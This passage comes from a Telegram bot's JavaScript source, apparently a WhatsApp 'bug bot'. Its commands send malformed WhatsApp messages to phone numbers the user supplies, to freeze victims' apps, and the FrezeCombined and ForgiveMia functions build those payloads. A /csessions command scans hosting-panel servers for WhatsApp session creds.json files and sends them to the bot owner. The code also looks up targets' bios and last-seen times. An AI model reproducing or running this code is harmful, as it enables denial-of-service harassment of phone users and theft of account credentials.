    return ctx.reply(successMsg, { parse_mode: "Markdown" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `\`\`\`js
🔴 <b>SYNTAX ERROR DETECTED</b>

❌ <b>Status:</b> Gagal parse kode
🧠 <b>Engine:</b> Node.js V8
📍 <b>Error Type:</b> ${err.name}

🧾 <b>Detail Pesan:</b>
<pre>${err.message}</pre>

🛠️ <b>Kemungkinan Penyebab:</b>
• Kurung <code>() {} []</code> tidak seimbang
• Salah penempatan <code>async / await</code>
• Typo keyword JavaScript
• Karakter ilegal / tidak tertutup

📌 <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

💀 <i>Fix it, then we talk again.</i>
\`\`\``;

    return ctx.reply(errorMsg, { parse_mode: "Markdown" });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  const replyId = ctx.message.message_id;

  if (!input) {
    return ctx.reply(
      "⚠️ *Masukan URL website*\n\nContoh:\n`/trackweb https://example.com`",
      { reply_to_message_id: replyId, parse_mode: "Markdown" }
    );
  }

  let url;
  try {
    url = input.startsWith("http") ? new URL(input) : new URL("https://" + input);
  } catch {
    return ctx.reply("❌ URL tidak valid.", { reply_to_message_id: replyId });
  }

  const domain = url.hostname;

  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, {
      timeout: 10000,
      validateStatus: () => true
    });

    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";

    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";

    const output = `\`\`\`js
🔍 *WEB TRACK RESULT*

🌐 *Domain*
${domain}

📡 *Network*
IP       : ${dnsResult.address}
Family   : IPv${dnsResult.family}

🖥 *Server*
WebSrv   : ${server}
Powered  : ${powered}
CloudFlr : ${cloudflare}

🔐 *Security*
HTTPS    : ${ssl}
Status   : ${res.status}

🧩 *Headers*
CSP      : ${headers["content-security-policy"] ? "Yes" : "No"}
HSTS     : ${headers["strict-transport-security"] ? "Yes" : "No"}
X-Frame  : ${headers["x-frame-options"] ? "Yes" : "No"}

⚠️ *Note*
• Data publik
• Aman & legal
\`\`\``;

    ctx.reply(output, {
      reply_to_message_id: replyId,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal analisis website.", { reply_to_message_id: replyId });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("❌ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("🔍 Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
📡 Status: ${statusText}
📄 HTTP Code: ${res.status}
⏱ Response Time: ${ping} ms

✅ Website masih bisa diakses Jier😭🗿😌`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
🔴 Status: DOWN WKWKWK
⏱ Timeout / No Response

❌ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("multibug", async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");

    if (!args) {
      return ctx.reply(
        "❌ *Format salah*\n\n" +
        "📌 Contoh:\n" +
        "`/multibug 62xxx, 62xxxx, 62xxxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 *MULTI BUG STARTED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 10;
      for (let i = 0; i < loopBug; i++) {
        await sleep(1000);
        await FrezeCombined(sock, target)
        await sleep(1000);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ *MULTI BUG COMPLETED*\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;

  let target;

  // === REPLY TEXT SI ANJING ===
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  }

  // === PAKE USERBAME SI TOLOL @ ===
  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("⚠️ Salah Tolol!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "❌ dongo gabisa cek ID via @username tanpa reply.\n📛 Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("❌ User tidak ditemukan");
    }
  }

  // === Validate User Si hama ===
  if (!target.username) {
    return ctx.reply(
`❌ *GAGAL CEK USER*

👤 Nama: ${target.first_name}
📛 User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
`✅ *USER DITEMUKAN*

👤 Nama: ${target.first_name}
🆔 ID: \`${target.id}\`
🔗 Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});


bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary" }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp
\`\`\``,
                {
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary" }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `\`\`\`js
⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>
\`\`\``;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}`, style: "primary"}]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}`, style: "primary"}]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `\`\`\`js
⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio
\`\`\``,
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}`, style: "primary"}]
                    ]
                }
            }
        );
    }
});
// =================== /carisesi ===================
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
//============( MENU UTAMA ) =======\\
bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});

const userFirstStart = new Set();

bot.start(async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);

    const progressMsg = await ctx.reply("⌛ *Memuat Script...*", {
      parse_mode: "Markdown",
    });
    await new Promise(resolve => setTimeout(resolve, 800));
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      null,
      "✅ *Script berhasil diakses*",
      { parse_mode: "Markdown" }
    );
    await new Promise(resolve => setTimeout(resolve, 800));
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      null,
      "⌛ *Memuat menu...*",
      { parse_mode: "Markdown" }
    );
    await new Promise(resolve => setTimeout(resolve, 500));
    await ctx.deleteMessage(progressMsg.message_id);
  }

    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    
    const menuMessage = `\`\`\`js
𑁍┊𝙂𝙇𝙊𝙍𝙔 𝙀𝙓𝙄𝙏𝙐𝙎 𝙋𝙍𝙄𝙈𝙀 4.0.0     
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝚂𝙲𝚁𝙸𝙿𝚃
┊⛨ Developer : @R4f14ndr4
┊⛨ Platform : Telegram
┊⛨ Version: 4.0.0
┊⛨ Protection : ACTIVE
┊⛨ RilisDate : 30/7/26
┊⛨ ScriptName : EXE-CUTIVE
┗━━━━━━━━━━━━━━━━━━
© 2026 - 2027 | All Rights Reserved
\`\`\``;

const keyboard = [
    [
        { text: "𝗕𝗨𝗚", callback_data: "/bug", style: "danger" },
        { text: "𝗧𝗢𝗢𝗟𝗦", callback_data: "/fun", style: "primary" }
    ],
    [
        { text: "𝗢𝗪𝗡𝗘𝗥", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  
    const menuMessage = `\`\`\`js
𑁍┊𝙂𝙇𝙊𝙍𝙔 𝙀𝙓𝙄𝙏𝙐𝙎 𝙋𝙍𝙄𝙈𝙀 4.0.0     
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝚂𝙲𝚁𝙸𝙿𝚃
┊⛨ Developer : @R4f14ndr4
┊⛨ Platform : Telegram
┊⛨ Version: 4.0.0
┊⛨ Protection : ACTIVE
┊⛨ RilisDate : 30/7/26
┊⛨ ScriptName : EXE-CUTIVE
┗━━━━━━━━━━━━━━━━━━
© 2026 - 2027 | All Rights Reserved
\`\`\``;

const keyboard = [
    [
        { text: "𝗕𝗨𝗚", callback_data: "/bug", style: "danger" },
        { text: "𝗧𝗢𝗢𝗟𝗦", callback_data: "/controls", style: "primary" }
    ],
    [
        { text: "𝗢𝗪𝗡𝗘𝗥", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const controlsMenu = `\`\`\`js
𑁍┊𝙂𝙇𝙊𝙍𝙔 𝙀𝙓𝙄𝙏𝙐𝙎 𝙋𝙍𝙄𝙈𝙀
━━━━━━━━━━━━━━⪼
┏━⪼ 𝙲𝙾𝙽𝚃𝚁𝙾𝙻 𝙼𝙴𝙽𝚄
┊⌬ /addsender - Add Sender Number
┊⌬ /resetsession - Reset Existing Session
┊⌬ /setcooldown - Set Bot Cooldown
┊⌬ /addprem - Add Premium Users
┊⌬ /delprem - Delete Premium Users
┊⌬ /addgroup - Add Premium Group
┊⌬ /delgroup - Delete Premium Group
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
© 2026 - 2027 | All Rights Reserved
\`\`\``;

const keyboard = [
    [
        { text: "🔙 𝗕𝗔𝗖𝗞", callback_data: "/start", style: "primary" }
    ],
    [
        { text: "📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `\`\`\`js
𑁍┊GLORY EXITUS PRIME
━━━━━━━━━━━━━━⪼
┏━⪼ 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
┊⌬ /xflower [ Freeze Invisible Hard ]
┊⌬ /xspam [ Freeze Invisible Spam Free ]
┊⌬ /xphantom [ WhatsApp Delay Freeze  ]
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
┏━⪼ 𝐌𝐮𝐥𝐭𝐢 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
┊⌬ /multibug [ Bug Lebih Dari 1 Nomor ]
┊⌬ Example: /Forcex 62xxxx 
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼
© 2026 - 2027 | All Rights Reserved
\`\`\``;

const keyboard = [
    [
        { text: "🔙 𝗕𝗔𝗖𝗞", callback_data: "/start", style: "primary" }
    ],
    [
        { text: "📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/GLORYEXITUS", style: "success" }
    ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//============( CASE BUG ) =======\\
bot.command("xphantom", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xphantom")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xphantom 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `\`\`\`js
𑁍┊𝙂𝙇𝙊𝙍𝙔 𝙀𝙓𝙄𝙏𝙐𝙎 𝙋𝙍𝙄𝙈𝙀
© 2026 - 2027 | All Rights Reserved          
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: WhatsApp Delay Freeze 
┊々 Status: Process
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 4; i++) {
   await FrezeCombined(sock, target)
   await sleep(900);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`js
𑁍┊𝙂𝙇𝙊𝙍𝙔 𝙀𝙓𝙄𝙏𝙐𝙎 𝙋𝙍𝙄𝙈𝙀
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: WhatsApp Delay Freeze 
┊々 Status: Sukses
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});

bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xspam")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible Spam Free
┊々 Status: Process
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 5; i++) {
   await ForgiveMia(sock, target)
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved         
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible Spam Free
┊々 Status: Sukses
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});

bot.command("xflower", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xflower")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xflower 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible Hard
┊々 Status: Process
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 10; i++) {
   await comboV5(sock, target)
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`js
𑁍┊GLORY EXITUS PRIME
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible Hard
┊々 Status: Sukses
\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}`, style: "primary"}
      ]]
    }
  });
});
//============( CASE MURBUG ) =======\\m


//============( FUNCTION ) =======\\m
async function FrezeCombined(sock, target) {
    const CrBZB = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Nando Officiall ¡!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };
    const CrbB = generateWAMessageFromContent(target, CrBZB, {});
    await sock.relayMessage(target, CrbB.message, {
        noSelfSync: true,
        messageId: CrbB.key.id
    });

    const CrBZA = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Nando Officiall ¡!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };
    const CrbA = generateWAMessageFromContent(target, CrBZA, {});
    await sock.relayMessage(target, CrbA.message, {
        noSelfSync: true,
        messageId: CrbA.key.id
    });
}

async function ForgiveMia(sock, target) {
    try {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9999999999999,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "Mia.Queen",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: Buffer.alloc(0)
                            }
                        },
                        body: { text: "—Forgive Me Queen Mia" },
                        nativeFlowMessage: {
